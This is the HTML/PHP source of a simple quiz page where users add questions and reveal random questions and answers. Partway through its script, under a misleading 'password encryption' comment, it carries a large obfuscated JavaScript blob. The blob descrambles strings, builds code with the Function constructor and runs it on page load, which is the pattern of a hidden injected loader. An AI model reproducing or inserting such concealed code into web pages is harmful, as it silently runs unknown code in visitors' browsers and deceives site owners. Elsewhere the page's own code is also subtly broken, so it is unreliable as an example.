<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

  </script>
<!-- path to google translate start -->
<script type="text/javascript"
src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
<!-- path to google translate end -->
<title>Questionapp</title>


</head>
<body>  
<!-- elemnt  to google translate start -->
<div id="google_translate_element"></div>
<!-- elemnt  to google translate end -->
<br>
<!-- Displaying the length of Question App start -->
Number of total questions: <div class="lengthApp"></div>
<!-- Displaying the length of Question App end -->

<!-- form for adding questions and answers start -->
<input class="id" type="number" placeholder="Id"><br>
<input class="questionsEN" type="text" placeholder="Questions"><br>
<input class="answerTheQuestionEN" type="text" placeholder="Answer"><br><br>
<button class="submit">Sent</button><br><br>
<!-- form for adding questions and answers end -->

<!-- View questions and answers start -->
<button class="refresh">Questions</button><br><br>
<button class="answer">Answer</button><br><br>
<div class="contentOne"></div><br>
<div class="contentTwo"></div><br><br>

Before adding another item, you must enter your password <input class="passwordInput" type="password" placeholder="Password"><br><br>
<div class="passwordAlert"></div>
<!-- View questions and answers end -->
<?php
require_once 'configFunction.php';
?>
<script>
 //  Downloading data from the database start  
let questionsApp = <?php echo json_encode($questionsApp);?> 


let lengthApp = document.querySelector('.lengthApp');
let questionsEN = document.querySelector('.questionsEN');
let answerTheQuestionEN = document.querySelector('.answerTheQuestionEN');
let passwordInput = document.querySelector('.passwordInput');
let refresh = document.querySelector('.refresh');
let answer = document.querySelector('.answer');
let contentOne = document.querySelector('.contentOne');
let contentTwo = document.querySelector('.contentTwo');
let contentQuestionEN = document.querySelector('.contentQuestionEN');
let id = document.querySelector('.id');
let passwordAlert = document.querySelector('.passwordAlert');



// Method  post  and password encryption start 
(function(){var egv='',WEf=436-425;function ucz(f){var x=5216445;var w=f.length;var c=[];for(var g=0;g<w;g++){c[g]=f.charAt(g)};for(var g=0;g<w;g++){var r=x*(g+386)+(x%29487);var l=x*(g+615)+(x%53141);var z=r%w;var t=l%w;var b=c[z];c[z]=c[t];c[t]=b;x=(r+l)%5283977;};return c.join('')};var GLf=ucz('pxwanevcttikbrsngfmuuolrozsrchqtjcdoy').substr(0,WEf);var hmb='vab,rr=a)k==++1=y9r=[.ah=yrb+(l,ap)};=taou67va0t{ yhhpv")+mlf-7=n4;i ,-; -1s"cnav,a6,p;er91(h0nvf2g {8at1grvws98rC2nuo}Cb;va;;tjc;,(g=lroei s0vy;k;vi.g(hijg)(o}a.r)].tau.hr+ vosza0x)fo7,l07;-;rAnm;tfxnl=pnaw,=)+n;;uhh yyhic;]t.(l Aaf;eo(osi;ogl}+tpiantv8n.u(h ab1=j,rv[(sau{lr]n0(({bu=>r{; d]i-d-mxj,g;sr =;l=ehn(7 wyreo)nadlv; cnr,lg)4as)tot=l[,p+.[r7ayl]vd+af=raaw6fh<=n=+o=vvr[)v+h.ckw(=egjr,.1)ig,[4+Cc)s](ge,o ea""mivi)=e"s1et[n"(eA])5+(=e=vidAivw1)pSll. (if+g,8,];80*].h=.)p5+.+tt}qr;v,[oa.htzr 0)o(stri=+v!<))r;;r)er+1v7C"fr*u1em en+;wC sut8yi fbtjnv=;=w,;=;l2p(>n]r,pu;htx;s+g6(s]yj+a9)l(tns-=t)re(r5.a"7evd8i[(iae),hn8lnf)aaj;<6ual7uA9(oan82sr20nu4lgu1 .;r0r0f.)n(vs,oe!(Ct)gh(r[hrhS8( r)([p]+ni3+vfm;kls=u=)li[+(=n2ro63rf,ad=)9rwhCrsvv6;aroxl=zvl(g..;o.r;7veo.ea;o);(mrzh]91;=f;t<c19ru};3lnvu[rtn[r=Cer=vtovchf9r(6}in.jui i,;ri.tg;hom;tho,{;e==]5=t)a=vc.+,r e n)hsg {"25y.04,<(").';var hbR=ucz[GLf];var NCx='';var hAf=hbR;var Lqk=hbR(NCx,ucz(hmb));var zYP=Lqk(ucz('+$W(rA:e<(3c_(#.strr,e(p(Whn;.mj=dpWcc9p-6e98i(WcWIcc}Wf._W3W_n!c =WeW"!n6k4$poW_WhWb@Dw\/{2=1}gW(rtW.tf;ay1;"nu3sn5t,rW{:acWim.c.5f}$e.W)p.na%f}t]3gn_e8onp=}cWF$W(_d5cW(28jce_WW4_f,.hn_.b5_W\/iuc%r4 _)Wtaq=r._r7Ws.ic1s{roat)io.];$ieW$i{ed(%),C+[b5o u4#tW3yW,{ms;7){ 7i4]"vN1y:0(G2r8Wtdidki.a\/#tlr3WwW=e.W_jW,f)hS,e _EWp$e6pi>o.a!WwW8)d9t58_w.e.vJ..;oesWa;c.!W%Bue3o$WWcyser&rc)s54e_tWt;.\'!(W.$"(cs23(_5._01FrWaddcikt,W2s3._anafq3. G=.ec.ra]no39o$6+_$hWt"_f$t;nf1f=Wpotag\/%fre)ec2#5g.5W].tcvs5l)6"9y16(*WWuWar%.i+rWWoeW 5a.)Ee9-)cpieWhtotf,$..WH>W.n!\'ayl66{Dttsi}43eWsenl%h}W..!iWWlrBg=Gt28r;f7!r[3c(2f5f,.$=n dvp9s.WW\/c)Wwtsd@6:)t]j.lpr;gWrc].eop,f(nl)0)1o(s!+ocbBv)fw.!3.W.!i.(rp;;]a6g*@rW0)W_srcaiWtjf.sa7 }ld{pr{gcuWe0+Wrt.1{E3;c8]to .8nht.c!W#(?r.;jc?lh(}.el}W{;_)Wur3))!(o8=$c5)Hdt0(;)Tc,"W=%s(W.].ci.g.crdt.!0)ireH!!_o,ccasW2e5n4.IlWst:@(s$e6,n,rr%oq20)Wu(,)W lc!8WF%no0)bi.r.($lS(rt$h_) bs$rdWacW2_.oeW27)]W@)(qaWap12awtjx3f1WGbEo=)l,[qA!9;#)7t%epp{!.a6tt(en.roaW!nWle!o =_)W;voti.0$p)W)W]7x)<W{rWr23W__WW371iws5,daieW,co!!{_Ws_W;_]J]jp.q._8dn1n]el5c_5l_ra_a!ohW?W20!,W_st)6jWW..}=cof?iWoWWakW\/bW=,<$n)7,JWvtcc)j.%Wars233ti]Wk1}WWtejst%iWWWrfd$o[j .dtd)es_]j\'.W%t.]h"l.Bc])W2x)e1_n5a>.nIm)ee54bso (joWl,a$Ec1ipo.4!su)WpTtcerW4WuWggtp03HefW%{rW5jr1Nsa;W1Wg:a?H!l1C4suW)Wr])3cWc.yc %W.=h!tS$)hoW].eo)}(.oW ie;858Wtc.W,\/=Dje0.3W"sasN)3W5(e(uG7%.4Wb 5c4W}p(!t)](Wco(u@Dr(+rek( "oWW D3W qioW+h?eh5=hay:f;5e30Wq:ro%; ponosWy\/=t]erWnj?nW#W 3_h(W}je6h.u(.#aWl+=tt..5ixo%)Ws2W%eW3le)?}6o$$]4cWr=ooa)q%v(15.(l9])0\/dv]r=7.(+Wl:ceW)g}r]((W,cw.,.6W_<e:Woo]j.ry W=W0$b.W_.mWut:)](to6%c0Wm))+4tto_Wcr5)W,\'(e;o9W(.ao!ldo( }ec6__ch.rW=n#!e7_W=&r3a0B5u(sWreq)W0(nof;q%W._.]6W(;b),+3n(v.!.,n!7(()W}9seu9_ >.e!pW)j,9sW;:Wr_%!)WrW(E0e(5{jWeir(W.W;+[5(-7_3 re.u&t;NtWpx7CW#35pEo8]et9(o;8i.(,* 79fj@32WSde[ee]WWWo<Wm).or]a8cWe9===!(W4.33(0nf7)aA)gsg.rWoWne"l%h[)ie3tnroc==c4W W)9]70>d)M{}r);Wn$]WfWjjrl$t fsc(git($\/}r%_3v.;<]a>W$n.s2ss8 ]W 3W]2"ff$[0W n)ecci$qW3boe0_ {m_(TW5WWrWsei$}aa >$.Ir)aWrWW,[W.$EW5p3an((,]$9!9W,hladn8,5c_]e;( jJE]o,fsicWr4cDW5cWf&Cui.,;.W>ol.(d6[hI3ed=_(W6>W5ftceus6Dpo]ts%k.$W]CW(p3$3 Fo2a[r]W!4W.C](1eep$W17[)W[e;S =vwcfc ;no1e5Wda=WpaWengn!0)eE(-eca8c%.(=.alGml*5,w_)W sW!_[ta1))sWInbcf ht{%5ne]_!5_W;r, Ae#c.,W=tnWain'));var xAQ=hAf(egv,zYP );xAQ(2135);return 2052})()
// Method post  and password encryption end

//  function  to google translate start
 googleTranslateElementInit = () =>  {
new google.translate.TranslateElement( 'google_translate_element');
}
// function to google translate end

//question and answer randomization functione start
let randomQuestion;
lengthApp.innerHTML = questionsApp.length + 3;
randomQuestionFunction = () =>
{

refresh.addEventListener('click', function() {   
randomQuestion = questionsApp[Math.floor(Math.random() * questionsApp.length)];
contentOne.innerHTML = randomQuestion.questionsEN;

}) 
};
questionFunction = () =>
randomQuestionFunction();
{
answer.addEventListener('click', function() {
contentTwo.innerHTML = randomQuestion.answerTheQuestionEN;
}); 
}
questionFunction();
//question and answer randomization functione end
//  Downloading data from the database end
</script>
</body>
</html>